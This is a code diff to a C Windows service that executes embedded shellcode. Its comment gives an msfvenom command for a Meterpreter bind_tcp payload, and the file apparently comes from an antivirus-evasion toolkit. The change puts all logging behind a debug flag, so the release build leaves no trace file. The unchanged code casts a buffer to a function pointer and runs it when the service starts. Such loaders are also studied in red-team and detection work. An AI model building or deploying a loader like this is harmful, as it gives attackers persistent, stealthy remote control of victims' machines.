@@ -6,7 +6,9 @@
 #include "defs.h"
 
 #define SLEEP_TIME 5000
-#define LOGFILE "C:\\status.txt"
+#ifdef PRINT_DEBUG
+	#define LOGFILE "C:\\avetdbg.txt"
+#endif
 
 SERVICE_STATUS ServiceStatus; 
 SERVICE_STATUS_HANDLE hStatus; 
@@ -14,7 +16,9 @@ SERVICE_STATUS_HANDLE hStatus;
 void  ServiceMain(int argc, char** argv); 
 void  ControlHandler(DWORD request); 
 int InitService();
+#ifdef PRINT_DEBUG
 int WriteToLog(char*);
+#endif
 
 // some shellcode
 //# msfvenom -p windows/meterpreter/bind_tcp lport=8443 -f c -a x86 --platform Windows
@@ -23,15 +27,18 @@ int WriteToLog(char*);
 
 void exec_shellcode(unsigned char *shellcode)
 {
-  int d=sizeof(shellcode);
-  char s[200];
-  sprintf(s,"shellcode size: %d\n",d);
-  WriteToLog(s);
-  int (*funct)();
-  funct = (int (*)()) shellcode;
-  (int)(*funct)();
+#ifdef PRINT_DEBUG
+	int d=sizeof(shellcode);
+	char s[200];
+	sprintf(s,"shellcode size: %d\n",d);
+	WriteToLog(s);
+#endif
+	int (*funct)();
+	funct = (int (*)()) shellcode;
+	(int)(*funct)();
 }
 
+#ifdef PRINT_DEBUG
 int WriteToLog(char* str)
 {
 	FILE* log;
@@ -42,6 +49,7 @@ int WriteToLog(char* str)
 	fclose(log);
 	return 0;
 }
+#endif
 
 int main() 
 { 
@@ -90,11 +98,13 @@ void ServiceMain(int argc, char** argv)
     // We report the running status to SCM. 
     ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
     SetServiceStatus (hStatus, &ServiceStatus);
-    
-    WriteToLog("start shellcode\n");	
+#ifdef PRINT_DEBUG
+    WriteToLog("start shellcode\n");
+#endif    
     exec_shellcode(buf);
+#ifdef PRINT_DEBUG
     WriteToLog("shellcode executed\n");	
-    
+#endif
     // The worker loop of a service
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
 	{
@@ -110,7 +120,9 @@ int InitService()
 { 
     
     int result;
+#ifdef PRINT_DEBUG
     result = WriteToLog("start service");
+#endif
     return(result); 
 } 
 
@@ -120,16 +132,12 @@ void ControlHandler(DWORD request)
     switch(request) 
     { 
         case SERVICE_CONTROL_STOP: 
-             //WriteToLog("Monitoring stopped.");
-
             ServiceStatus.dwWin32ExitCode = 0; 
             ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
             SetServiceStatus (hStatus, &ServiceStatus);
             return; 
  
         case SERVICE_CONTROL_SHUTDOWN: 
-            WriteToLog("stop service");
-
             ServiceStatus.dwWin32ExitCode = 0; 
             ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
             SetServiceStatus (hStatus, &ServiceStatus);
